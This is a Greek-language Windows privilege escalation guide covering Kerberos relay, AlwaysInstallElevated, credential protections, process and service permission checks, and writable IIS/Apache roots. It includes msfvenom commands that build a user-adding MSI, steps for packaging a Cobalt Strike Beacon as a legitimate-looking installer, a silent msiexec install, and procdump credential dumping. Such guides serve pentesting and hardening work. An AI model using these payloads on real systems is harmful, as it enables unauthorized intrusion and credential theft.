Ένα τοπικό Kerberos relay μπορεί να μεταβεί από μια σύνδεση με χαμηλότερα προνόμια σε εγγραφή σε κατάλογο με αυξημένα προνόμια, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και το relayed principal έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay τεκμηριώνει](https://github.com/cube0x0/KrbRelay) εγγραφές LDAP τόσο για RBCD όσο και για `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί κατάλληλη delegation και δικαιώματα στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον τομέα.

Ελέγξτε την πολιτική του πραγματικού DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), το ACL του αντικειμένου για την relayed ταυτότητα, καθώς και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Έχουν σημασία ο τύπος σύνδεσης του caller και το περιβάλλον διαπιστευτηρίων: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή σύνδεση new-credentials. Η δρομολόγηση firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να επηρεάσουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL με κατάλληλα δικαιώματα ως υποψήφια για έλεγχο· η παθητική απαρίθμηση δεν θα πρέπει να προκαλεί COM coercion, relay authentication ή εγγραφές στον κατάλογο. Ένα shadow credential για λογαριασμό μηχανήματος μπορεί να οδηγήσει σε machine ticket και, μόνο αν αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα αναπαραγωγής καταλόγου, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτές οι 2 καταχωρήσεις μητρώου είναι **ενεργοποιημένες** (τιμή **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο προνομίων μπορούν να **εγκαταστήσουν** (να εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το δυαδικό αρχείο που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν θέλετε **απλώς** να **εκτελέσετε** **γραμμές εντολών**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** ως τοποθεσία, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Κάντε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων προς συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Έπειτα κάντε κλικ στο **Finish**.
- Επιλέξτε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι διασφαλίζεται ότι το payload Beacon θα εκτελεστεί μόλις εκτελεστεί το πρόγραμμα εγκατάστασης.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **κάντε build**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Ανιχνευτές

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, επομένως πρέπει να δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding: έχει ενδιαφέρον να γνωρίζετε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε έναν τομέα. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης τοπικού admin, εφόσον έχουν εξουσιοδότηση.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **οι κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Προστασία LSA

Από τα **Windows 8.1** και μετά, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA), ώστε να **αποκλείει** τις προσπάθειες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την Προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές, όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Αποθηκευμένα διαπιστευτήρια

**Τα διαπιστευτήρια τομέα** πιστοποιούνται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα αποθηκευμένα διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Enumerate χρήστες και ομάδες

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε διαθέτει ενδιαφέροντα δικαιώματα

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς να τις καταχραστείτε για να κλιμακώσετε τα προνόμιά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες

```bash
qwinsta
klist sessions
```

### Φάκελοι χρηστών

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την απαρίθμηση των διεργασιών, **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη command line της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο εκτελούμενο δυαδικό αρχείο** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του δυαδικού αρχείου, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τα εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας.

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα παθητικό στιγμιότυπο θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που παρατηρείτε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα του χρήστη με χαμηλότερα προνόμια να αποκτήσει πρόσβαση σε αυτόν· το όνομα μιας εφαρμογής ή μια debug flag από μόνη της δεν αποδεικνύει δυνατότητα εκτέλεσης κώδικα μεταξύ χρηστών. Κρατήστε την τακτική απαρίθμηση παθητική, χωρίς να στέλνετε εντολές debugger.

**Έλεγχος δικαιωμάτων των δυαδικών αρχείων των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων στους φακέλους των εκτελέσιμων αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν `dynamicpreprocessor directory` που δηλώνεται στο configuration που επιλέγεται με `snort.exe -c <config>`. Για scheduled task ή service που εκτελεί το Snort με διαφορετικό account, ελέγξτε το συγκεκριμένο configuration και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργήσει αρχεία εκεί, η διαδρομή αξίζει να εξεταστεί ως υποψήφια για code execution την επόμενη φορά που το task ή το service θα φορτώσει modules. Επαληθεύστε τα effective privileges του run-as account, το ενεργό configuration, τη συμβατότητα των modules και τυχόν deny ή share περιορισμούς· το ότι ένας κατάλογος είναι εγγράψιμος από μόνο του δεν αποδεικνύει escalation. Η [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά τον χρόνο εκτέλεσης.

### Privileged web service με εγγράψιμο document root

Σε εγκατάσταση Apache σε Windows, συγκρίνετε το executable path και το run-as account του service με το `DocumentRoot` στο ενεργό `httpd.conf`. Για μια συμβατική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του διαμορφωμένου document root, που συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα privileges μπορεί να δημιουργεί αρχεία σε αυτόν τον κατάλογο ενώ ο Apache εκτελείται ως `LocalSystem`, η εκτέλεση server-side code ενδέχεται να υπερβεί το όριο privileges του host. Επιβεβαιώστε ότι το service εκτελείται, ότι εξυπηρετείται η ακριβής διαδρομή και ότι ένας server-side handler επεξεργάζεται τον συγκεκριμένο τύπο αρχείου· ένας εγγράψιμος κατάλογος από μόνος του αποδεικνύει μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα αρχείο `C:\wamp64\bin\apache\apache*\bin\httpd.exe` με έκδοση στο όνομα (ή σε `C:\wamp\...` για διάταξη 32-bit), με τις ρυθμίσεις δίπλα του, στον φάκελο `conf\httpd.conf`, και ως προεπιλεγμένο root το `C:\wamp64\www` ή το `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, τον λογαριασμό εκτέλεσης, το ενεργό `DocumentRoot` (μαζί με την ανάπτυξη του `${INSTALL_DIR}` και τις παρακάμψεις virtual host) και το ACL του root. Ένας εγγράψιμος φάκελος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι θα εκτελέσει το αρχείο που υποβλήθηκε. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου του application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε έναν **ενεργό ιστότοπο/εφαρμογή** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το pool που έχει ρυθμιστεί και τον handler από την πλευρά του διακομιστή. Ο κώδικας που τοποθετείται σε έναν κατάλογο που εξυπηρετείται εκτελείται ως το pool μόνο αν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Ελέγξτε την πραγματική πρόσβαση του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του site, τον handler και τις παρακάμψεις ανά διαδρομή προτού θεωρήσετε ότι ένας εγγράψιμος κατάλογος επιτρέπει εκτέλεση κώδικα.

Η δυναμική μεταγλώττιση ASP.NET δημιουργεί ένα ξεχωριστό μονοπάτι που πρέπει να ελεγχθεί: τα παραγόμενα αρχεία στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλογή είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να τον αλλάξει. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token με χαμηλότερα προνόμια μπορεί να τροποποιήσει παραγόμενο source στην **συγκεκριμένη** cache της εφαρμογής, εξακριβώστε αν η εφαρμογή το μεταγλωττίζει ξανά με πιο προνομιούχα [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε την cache με την ενεργή εφαρμογή, το ενεργό token και ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα της διεργασίας και τον χρόνο οποιασδήποτε επαναμεταγλώττισης. Χρησιμοποιήστε έλεγχο μεταδεδομένων μόνο για ανάγνωση· μην ενεργοποιήσετε μεταγλώττιση και μην τροποποιήσετε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool ρυθμισμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως αυθεντικοποιείται σε πόρους του domain ως **λογαριασμός υπολογιστή του host**, παρότι το τοπικό του token μπορεί να έχει χαμηλά προνόμια. Το `LocalSystem` έχει ήδη υψηλά τοπικά προνόμια και χρησιμοποιεί επίσης τον λογαριασμό υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί τον λογαριασμό που έχει ρυθμιστεί γι’ αυτό. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Μια παράλειψη στη ρύθμιση ταυτότητας μπορεί να κληρονομεί τις προεπιλογές του pool, οι οποίες διαφέρουν μεταξύ εκδόσεων του IIS, γι’ αυτό προσδιορίστε την ενεργή ρύθμιση αντί να βασίζεστε στο όνομα του pool. Αν η εκτέλεση κώδικα φτάνει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού μηχανήματος ή ένας ρόλος host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να εξετάζει τις ρυθμίσεις και τα ACL χωρίς να ανεβάζει αρχεία, να προκαλεί αυθεντικοποίηση δικτύου ή να ζητά tickets.

Για έναν αναγνώσιμο ASP.NET handler που εκκινεί βοηθητική διεργασία, παρακολουθήστε κάθε τιμή που προέρχεται από αίτημα, καθώς περνά από αυθεντικοποίηση, αποκρυπτογράφηση, επικύρωση και κατασκευή εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token στο `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε μεταχαρακτήρες του shell να αλλάξουν την εντολή· [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Βεβαιωθείτε ότι ένας μη έμπιστος καλών μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και στη συνέχεια προσδιορίστε την ενεργή ταυτότητα του application pool ή της πλαστοπροσωπίας, καθώς και την ταυτότητα της θυγατρικής διεργασίας. Μια αναγνώσιμη γραμμή source, ένας listener στο localhost ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση εντολών με αυξημένα προνόμια. Εξετάστε το source και τις ρυθμίσεις του pool χωρίς να στείλετε πλαστά αιτήματα ή να εκτελέσετε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP στα Windows, μια διαδρομή που ελέγχεται από το αίτημα και περνά στο [`include` or `require`](https://www.php.net/manual/en/function.include.php) μπορεί να αξιολογήσει ένα αρχείο PHP εγγράψιμο από χρήστη χαμηλότερων προνομίων, με την ταυτότητα του worker. Επιβεβαιώστε ότι το αίτημα μπορεί να φτάσει σε αυτήν την εντολή, ότι η επιλυμένη διαδρομή δείχνει σε αρχείο που μπορεί να τροποποιήσει ο χρήστης χαμηλότερων προνομίων και να διαβάσει ο worker, ότι οι ισχύοντες περιορισμοί διαδρομών PHP επιτρέπουν το include και ότι ο worker εκτελείται πράγματι με υψηλότερα προνόμια. Ένας listener loopback ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτήν την αλυσίδα· εξετάστε τον source, την ταυτότητα της υπηρεσίας και τα ACL των αρχείων χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που εκτελείται χρησιμοποιώντας το **procdump** από το Sysinternals. Υπηρεσίες όπως το FTP έχουν **τα διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: «Windows Help and Support» (Windows + F1), αναζητήστε «command prompt» και κάντε κλικ στο «Click to open Command Prompt»

### Εισαγωγή αρχείων έργου με αυξημένα δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα έργα από έναν drop directory στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα δικαιώματα διασχίζει ένα όριο εμπιστοσύνης εισόδου με τα δικαιώματα του importer. Ελέγξτε την **ακριβή διαδρομή εγγραφής**, τη διεργασία ή την εργασία που την ανοίγει, την ταυτότητα με την οποία εκτελείται και την έκδοση του parser. Ένα [ιστορικό ζήτημα ανοίγματος/επαναφοράς έργου στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε τη χρήση XML external entities στα μεταδεδομένα έργου· ένα network entity στα Windows μπορούσε να προκαλέσει authentication από τον λογαριασμό εισαγωγής, αν το επιτρέπουν οι [πολιτικές εξερχόμενης κίνησης SMB και NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεση πρόσβαση διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής, εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται βάσει της πραγματικής κατάστασης των patches τους. Μην ανοίγετε ένα crafted project κατά την παθητική απαρίθμηση· ελέγξτε τη ροή εισαγωγής και τα ACL.

## Υπηρεσίες

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση αίτημα πρόσβασης [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService επιστρέφει ένα handle`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης στην υπηρεσία που ζητήθηκαν κατά τη δημιουργία· το εκ νέου άνοιγμα της υπηρεσίας αργότερα εκτελεί ξεχωριστό έλεγχο πρόσβασης και μπορεί να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το αποτελεσματικό τοπικό ή απομακρυσμένο token, τα δικαιώματα του handle που παραχωρήθηκαν, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου. Μη δημιουργείτε και μην εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει το **ίδιο network logon**, το υποκείμενο NTFS ACL του και μια τοπική διαδρομή εκτελέσιμου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός μη διαχειριστή μπορεί να διασχίσει αυτό το όριο αν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η διαδρομή τοποθέτησης του αρχείου· δεν απαιτείται κατ’ ανάγκη administrative share. Η πρόσβαση εγγραφής σε share από μόνη της ή μια ένδειξη δυνατότητας δημιουργίας υπηρεσίας SCM από μόνη της δεν αποδεικνύει ότι η νέα υπηρεσία μπορεί να εκκινηθεί με ταυτότητα υψηλότερων δικαιωμάτων.

Μια υπάρχουσα υπηρεσία ενδέχεται να καλέσει ένα βοηθητικό εκτελέσιμο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν του κύκλου ζωής της, ακόμη κι αν αυτό το βοηθητικό αρχείο απουσιάζει από το `ImagePath` της. Αν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο όπου μπορεί να γράψει χρήστης με χαμηλότερα δικαιώματα και η υπηρεσία εκτελείται με ταυτότητα υψηλότερων δικαιωμάτων, ένα αρχείο βοηθητικού προγράμματος που λείπει μπορεί υπό προϋποθέσεις να αντικατασταθεί. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού προγράμματος**, τη διαδρομή του εκτελέσιμου που επιλύεται και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας στον κατάλογο, την ταυτότητα της υπηρεσίας και τη διαθέσιμη ενεργοποίηση συμβάντος του κύκλου ζωής. Ένας κατάλογος υπηρεσίας με δικαιώματα εγγραφής ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία φορτώνει το αρχείο· κατά την παθητική ανασκόπηση, μην εκκινείτε και μη σταματάτε την υπηρεσία.

